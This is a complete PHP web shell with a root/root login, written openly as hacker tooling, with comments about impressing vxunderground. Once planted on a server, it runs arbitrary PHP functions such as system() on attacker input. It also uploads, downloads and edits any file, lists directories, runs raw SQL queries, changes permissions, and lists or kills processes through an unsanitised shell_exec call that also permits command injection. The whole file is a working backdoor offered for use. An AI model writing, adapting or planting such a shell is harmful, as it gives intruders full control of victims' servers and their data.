<?php
session_start();

$_ = "REQUEST"; // Changed to REQUEST to accept GET, POST, etc.

// Handle login
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($username === 'root' && $password === 'root') {
        $_SESSION['logged_in'] = true;
        echo "Login successful!";
    } else {
        echo "Invalid credentials";
    }
}

// Check if logged in
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    // Show login form
    ?>
    <form method="post">
        <input type="text" name="username" placeholder="Username" value="root">
        <input type="password" name="password" placeholder="Password" value="root">
        <input type="submit" name="login" value="Login">
    </form>
    <?php
    exit; // Stop execution if not logged in
}

// If logged in, proceed with other features

// Command execution
if (isset($_REQUEST["_"]) && isset($_REQUEST["__"]) && is_callable($_REQUEST["_"])) {
    ob_start();
    $_REQUEST["_"]($_REQUEST["__"]);
    $output = ob_get_clean();
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}

// File upload
elseif (isset($_POST['upload']) && isset($_FILES['file']) && isset($_POST['path'])) {
    $uploadPath = $_POST['path'] . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        echo "File uploaded successfully to $uploadPath";
    } else {
        echo "File upload failed";
    }
}

// File download
elseif (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "File not found";
    }
}

// File edit
elseif (isset($_POST['edit']) && isset($_POST['file']) && isset($_POST['content'])) {
    $file = $_POST['file'];
    if (file_exists($file) && is_writable($file)) {
        file_put_contents($file, $_POST['content']);
        echo "File saved successfully";
    } else {
        echo "Unable to save file";
    }
} elseif (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if (file_exists($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $extension = pathinfo($file, PATHINFO_EXTENSION);
        $mode = 'text'; // Default mode
        switch ($extension) {
            case 'php': $mode = 'php'; break;
            case 'js': $mode = 'javascript'; break;
            case 'html': $mode = 'html'; break;
            case 'css': $mode = 'css'; break;
            case 'py': $mode = 'python'; break;
            case 'java': $mode = 'java'; break;
            // Add more as needed
        }
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Advanced File Editor</title>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
            <style>
                #editor { 
                    position: relative;
                    height: 600px;
                    width: 100%;
                }
            </style>
        </head>
        <body>
            <form method="post">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <div id="editor"><?php echo htmlspecialchars($content); ?></div>
                <textarea name="content" id="content" style="display:none;"></textarea>
                <input type="submit" name="edit" value="Save">
            </form>
            <script>
                var editor = ace.edit("editor");
                editor.setTheme("ace/theme/monokai");
                editor.session.setMode("ace/mode/<?php echo $mode; ?>");
                editor.setOptions({
                    enableBasicAutocompletion: true,
                    enableSnippets: true,
                    enableLiveAutocompletion: true,
                    showPrintMargin: false,
                    fontSize: "14pt",
                    useSoftTabs: true,
                    tabSize: 4,
                    wrap: true,
                    highlightActiveLine: true,
                    showGutter: true,
                    behavioursEnabled: true
                });
                editor.commands.addCommand({
                    name: 'saveFile',
                    bindKey: {win: 'Ctrl-S', mac: 'Command-S'},
                    exec: function(editor) {
                        document.querySelector('#content').value = editor.getValue();
                        document.forms[0].submit();
                    }
                });
                document.querySelector('#content').value = editor.getValue();
                editor.session.on('change', function() {
                    document.querySelector('#content').value = editor.getValue();
                });
            </script>
        </body>
        </html>
        <?php
        exit;
    } else {
        echo "Unable to read file";
    }
}

// Directory listing and file system enumeration
elseif (isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    if (is_dir($dir)) {
        echo "<h2>Listing directory: " . htmlspecialchars($dir) . "</h2>";
        echo "<ul>";
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $fullPath = rtrim($dir, '/') . '/' . $file;
                if (is_dir($fullPath)) {
                    echo "<li><a href='?dir=" . urlencode($fullPath) . "'>[DIR] " . htmlspecialchars($file) . "</a></li>";
                } else {
                    echo "<li>" . htmlspecialchars($file) . " 
                        <a href='?download=" . urlencode($fullPath) . "'>[Download]</a>
                        <a href='?edit=" . urlencode($fullPath) . "'>[Edit]</a>
                        <a href='?hexview=" . urlencode($fullPath) . "'>[Hex View]</a>
                    </li>";
                }
            }
        }
        echo "</ul>";
    } else {
        echo "Invalid directory";
    }
}

// Hex view for binary files (to impress vxunderground with malware analysis vibes)
elseif (isset($_GET['hexview'])) {
    $file = $_GET['hexview'];
    if (file_exists($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $hex = bin2hex($content);
        $ascii = '';
        $hexLines = str_split($hex, 32);
        echo "<h2>Hex View of: " . htmlspecialchars($file) . "</h2>";
        echo "<pre>";
        $offset = 0;
        foreach ($hexLines as $line) {
            $hexStr = implode(' ', str_split($line, 2));
            $asciiStr = '';
            for ($i = 0; $i < strlen($line); $i += 2) {
                $byte = hex2bin(substr($line, $i, 2));
                $asciiStr .= (ctype_print($byte) ? $byte : '.');
            }
            printf("%08x: %-48s  %s\n", $offset, $hexStr, $asciiStr);
            $offset += 16;
        }
        echo "</pre>";
        exit;
    } else {
        echo "Unable to read file";
    }
}

// Database management (assuming MySQL/PDO - configure as needed)
elseif (isset($_POST['db_query'])) {
    $host = $_POST['db_host'] ?? 'localhost';
    $user = $_POST['db_user'] ?? 'root';
    $pass = $_POST['db_pass'] ?? '';
    $db = $_POST['db_name'] ?? '';
    $query = $_POST['query'] ?? '';

    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->prepare($query);
        $stmt->execute();
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);

        echo "<h2>Query Results</h2>";
        if (count($results) > 0) {
            echo "<table border='1'><tr>";
            foreach (array_keys($results[0]) as $key) {
                echo "<th>" . htmlspecialchars($key) . "</th>";
            }
            echo "</tr>";
            foreach ($results as $row) {
                echo "<tr>";
                foreach ($row as $value) {
                    echo "<td>" . htmlspecialchars($value) . "</td>";
                }
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "No results or query executed successfully (e.g., INSERT/UPDATE)";
        }
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
}

// Additional vxunderground-freak-out features: Process listing/killing
elseif (isset($_GET['processes'])) {
    $output = shell_exec('ps aux');
    echo "<h2>Process List</h2><pre>" . htmlspecialchars($output) . "</pre>";
} elseif (isset($_POST['kill_process'])) {
    $pid = $_POST['pid'];
    shell_exec("kill -9 $pid");
    echo "Process $pid killed";
}

?>

<!-- Advanced features for vxunderground-level freakout -->
<!-- Command execution form -->
<form method="get">
    <input type="text" name="_" placeholder="Function (e.g., system)" value="system">
    <input type="text" name="__" placeholder="Argument (e.g., ls -la)">
    <input type="submit" value="Execute">
</form>

<!-- Simple file upload form -->
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="text" name="path" placeholder="Upload path (e.g., .)" value=".">
    <input type="submit" name="upload" value="Upload">
</form>

<!-- Directory listing form -->
<form method="get">
    <input type="text" name="dir" placeholder="Directory path (e.g., .)" value=".">
    <input type="submit" value="List Directory">
</form>

<!-- Database management form -->
<form method="post">
    <input type="text" name="db_host" placeholder="DB Host" value="localhost">
    <input type="text" name="db_user" placeholder="DB User" value="root">
    <input type="password" name="db_pass" placeholder="DB Pass">
    <input type="text" name="db_name" placeholder="DB Name">
    <textarea name="query" placeholder="SQL Query" rows="5" cols="80"></textarea>
    <input type="submit" name="db_query" value="Execute Query">
</form>

<!-- Additional advanced features: File permissions changer -->
<form method="post">
    <input type="text" name="chmod_file" placeholder="File/path to chmod">
    <input type="text" name="chmod_mode" placeholder="Mode (e.g., 0777)">
    <input type="submit" name="chmod" value="Change Permissions">
</form>
<?php
if (isset($_POST['chmod']) && isset($_POST['chmod_file']) && isset($_POST['chmod_mode'])) {
    $file = $_POST['chmod_file'];
    $mode = octdec($_POST['chmod_mode']);
    if (file_exists($file)) {
        if (chmod($file, $mode)) {
            echo "Permissions changed successfully";
        } else {
            echo "Failed to change permissions";
        }
    } else {
        echo "File not found";
    }
}
?>

<!-- Process management -->
<a href="?processes=1">List Processes</a>
<form method="post">
    <input type="text" name="pid" placeholder="PID to kill">
    <input type="submit" name="kill_process" value="Kill Process">
</form>

<!-- Logout link -->
<a href="?logout=1">Logout</a>

<?php
// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>```
